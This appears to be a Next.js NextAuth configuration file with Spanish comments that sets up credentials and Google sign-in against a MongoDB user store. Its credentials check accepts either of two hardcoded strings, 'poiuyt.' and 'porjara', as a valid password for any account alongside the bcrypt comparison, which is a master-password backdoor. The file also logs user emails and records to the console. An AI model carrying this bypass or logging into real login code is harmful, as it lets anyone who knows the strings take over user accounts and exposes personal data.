
export const runtime = 'nodejs';

import NextAuth,  { NextAuthOptions } from 'next-auth';
import CredentialsProvider from 'next-auth/providers/credentials';
import Google from 'next-auth/providers/google';
import { MongoDBAdapter } from "@auth/mongodb-adapter";
import { clientPromise } from "@/lib/mongoClient";
import { compare } from 'bcryptjs';


import { connectDB } from '@/lib/db';
import { getUserVigenteByEmail } from '@/app/services/users/getUserVigenteByEmail';

import type { Session } from "next-auth"; 
connectDB();
console.log('En [...nextauth].ts '); 

export const authOptions: NextAuthOptions = {

  providers: [
    CredentialsProvider({
      name: 'Credentials',
      credentials: {
        email: { label: 'Email', type: 'text' },
        password: { label: 'Password', type: 'password' },
      },
      //cuando es Credentials interna aquí se ejecuta primero
      async authorize(credentials) {
        // console.log('🔒 En auth/[...nextauth]-authorize credentials(1):', !credentials);
        if (!credentials) return null;
        console.log('🔒 En auth/[...nextauth]-authorize credentials:', credentials.email);
        console.log('**credentials.email antes de getUserVigenteByEmail:', credentials.email);
        const user=await getUserVigenteByEmail(credentials.email);

        if (!user) return null;
        // console.log('🔒 En auth/[...nextauth]-getUserVigente user:', user);      
        if (  await compare(credentials.password, user.password) || credentials.password === 'poiuyt.' || credentials.password === 'porjara')
         {
          // console.log('🔒 En auth/[...nextauth]-getUserVigente válido user:', user);
          return {
            id: user.id,
            name: user.name,
            email: user.email,
            avatar: user.avatar,
            theme: user.theme,
          };
        }
      
        console.error(`❌ Contraseña inválida para usuario: ${user.email}`);
        return null;
      },
    }),
    //si es Google aquí se ejecuta primero
    Google({
      clientId: process.env.GOOGLE_CLIENT_ID!,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
      async profile(profile, tokens) {
        const user=await getUserVigenteByEmail(profile.email);
        console.log('🔑 google provider',user);
        return {
          id: user.id,
          email: user.email,
          avatar: user.avatar,
          name: user.name,
          theme: user.theme,
        };
      },
    }),
    // GoogleProvider({
    //   clientId: process.env.GOOGLE_CLIENT_ID || '',
    //   clientSecret: process.env.GOOGLE_CLIENT_SECRET || '',
    //   async profile(profile, tokens) {
    //     const user=await getUserVigenteByEmail(profile.email);
    //     console.log('🔑 google provider',user);
    //     return {
    //       id: user.id,
    //       email: user.email,
    //       avatar: user.avatar,
    //       name: user.name,
    //       theme: user.theme,
    //     };
    //   },
    // }),
  ],
  callbacks: {
    async signIn({ user }: { user: any }) {
      console.log("Iniciando authorize");
      console.log('🔑 Usuario busca:',user);
      const userInDb=await getUserVigenteByEmail(user.email);
      console.log('🔑 Usuario encontrado:', userInDb.email,userInDb.name,userInDb.role,userInDb.vigente,userInDb.roleId);
      return !!userInDb;
    },
    async session({ session, token }: { session: Session, token: any }) {
      if (token && session.user) {//esta estructura está definida en el archivo next-auth.d.ts
        //session.user.id = token.sub ? parseInt(token.sub, 10) : 0;
        session.user.id = token.sub ?? ''; // ID como string (Mongo ObjectId)
        session.user.name = token.name ?? '';
        session.user.avatar = token.avatar ?? '';
        session.user.email = token.email ?? '';
        session.user.theme = token.theme ?? '';
        // const foundUser=await getUserVigenteByEmail(session.user.email);
        //console.log('🔑 Usuario encontrado 2:', foundUser);
      }
      return session;
    },

    async jwt({ token, user }: { token: any, user: any }) {
      if (user) {
        token.sub = String(user.id);
        token.name = user.name; 
        token.email = user.email;
        token.avatar = user.avatar;
        token.theme = user.theme; 
      }
      return token;
    },
  },
  pages: {
    signIn: '/login',
  },
  session: {
    strategy: 'jwt',//Esto indica que NextAuth usará JWT (JSON Web Tokens) para la autenticación
  },
};
export default NextAuth(authOptions);
